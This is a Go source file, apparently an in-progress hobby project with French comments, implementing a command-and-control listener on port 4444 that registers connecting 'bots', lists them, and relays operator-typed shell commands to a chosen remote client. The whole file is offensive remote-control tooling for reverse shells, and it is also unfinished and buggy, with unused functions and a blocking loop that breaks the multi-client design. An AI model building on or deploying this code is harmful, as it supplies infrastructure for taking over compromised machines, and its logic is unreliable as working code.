package main

import (
	"bufio"
	"fmt"
	"io"
	"net"
	"os"
	"strconv"
	"strings"
	"sync"
)

type Client struct {
	ID      int
	Address string
	Conn    net.Conn
}

var clients = make(map[int]Client)
var clientCounter int
var mutex sync.Mutex

func handleCommands() {
	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		command := scanner.Text()

		if strings.TrimSpace(command) == "list" {
			listClients()
		} else {
			fmt.Println("COMMAND NOT FOUND, TYPE \"help\"")
		}
	}
}

func main() {
	server, err := net.Listen("tcp", ":4444")
	if err != nil {
		panic(err)
	}
	defer server.Close()
	fmt.Println("Listening on :4444")

	for {
		conn, err := server.Accept()
		if err != nil {
			panic(err)
		}
		rmAddr := conn.RemoteAddr().String()
		// useless type conversions
		conn_ip := strings.Split(rmAddr, ":")[0]
		conn_port_str := strings.Split(rmAddr, ":")[1]

		// Générer un nouvel ID pour chaque client
		mutex.Lock()
		clientCounter++
		clientID := clientCounter
		mutex.Unlock()

		// Ajouter le client à la map
		client := Client{
			ID:      clientID,
			Address: conn.RemoteAddr().String(),
			Conn:    conn,
		}
		mutex.Lock()
		clients[clientID] = client
		mutex.Unlock()

		fmt.Println("[+] New connection from " + conn_ip + ":" + conn_port_str)
		processCli(conn)

	}
}

func processCli(connection net.Conn) {
	defer connection.Close()
	buffer := make([]byte, 1024)
	mLen, err := connection.Read(buffer)
	if err != nil {
		panic(err)
	}
	message := string(buffer[:mLen])
	fmt.Println("Received :" + message)
	var res string = "pong"

	fmt.Println("Sending : " + res)
	connection.Write([]byte(res))

	// Lancer une goroutine pour lire la sortie du client

	// Lire les commandes du serveur (terminal) et les envoyer au client
	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		command := scanner.Text() + "\n"
		_, err := connection.Write([]byte(command))
		if err != nil {
			fmt.Printf("Erreur lors de l'envoi de la commande : %v\n", err)
			break
		}

		parts := strings.SplitN(command, " ", 2)

		clientIDStr := parts[0]
		cmd := parts[1]

		// Convertir l'ID en entier
		clientID, err := strconv.Atoi(clientIDStr)
		if err != nil {
			fmt.Println("ID de client invalide")
			continue
		}

		// Envoyer la commande à la connexion du client spécifié
		mutex.Lock()
		client, ok := clients[clientID]
		mutex.Unlock()
		if ok {
			sendCommand(client.Conn, cmd)
		} else {
			fmt.Printf("Client avec ID %d non trouvé\n", clientID)
		}

	}

}

func sendCommand(conn net.Conn, command string) {
	_, err := conn.Write([]byte(command + "\n"))
	if err != nil {
		fmt.Printf("Erreur lors de l'envoi de la commande : %v\n", err)
	}
}

func shellSession(conn net.Conn) {
	go io.Copy(os.Stdout, conn)
	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		command := scanner.Text() + "\n"
		_, err := conn.Write([]byte(command))
		if err != nil {
			fmt.Printf("Erreur lors de l'envoi de la commande : %v\n", err)
			break
		}
	}

}

func listClients() {
	mutex.Lock()
	defer mutex.Unlock()

	if len(clients) == 0 {
		fmt.Println("[i] No clients connected")
		return
	}

	for id, client := range clients {
		fmt.Printf("[BOT] ID: %d ADDR: %s", id, client.Address)
	}
}

//TIP See GoLand help at <a href="https://www.jetbrains.com/help/go/">jetbrains.com/help/go/</a>.
// Also, you can try interactive lessons for GoLand by selecting 'Help | Learn IDE Features' from the main menu.
